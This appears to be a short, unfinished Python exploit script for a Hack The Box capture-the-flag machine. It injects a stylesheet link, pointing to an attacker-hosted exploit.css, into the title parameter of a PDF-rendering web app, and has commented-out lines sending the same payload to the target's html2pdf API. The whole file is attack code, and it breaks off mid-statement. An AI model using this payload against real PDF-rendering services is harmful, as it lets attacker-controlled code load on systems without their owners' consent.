import requests
import json

payload = {'html':'<link rel=stylesheet href=\"http://localhost:9001/exploit.css\">'}
dumps = json.dumps(payload)

interface = requests.get("http://localhost:9000/index.php?pdf&title=<link rel=stylesheet href='http://localhost:9001/exploit.css'>")
print(interface.status_code)

#interface_api = requests.post("http://prd.m.rendering-api.interface.htb/api/html2pdf", data=dumps)
#print(interface_api.text)

#exploit = requests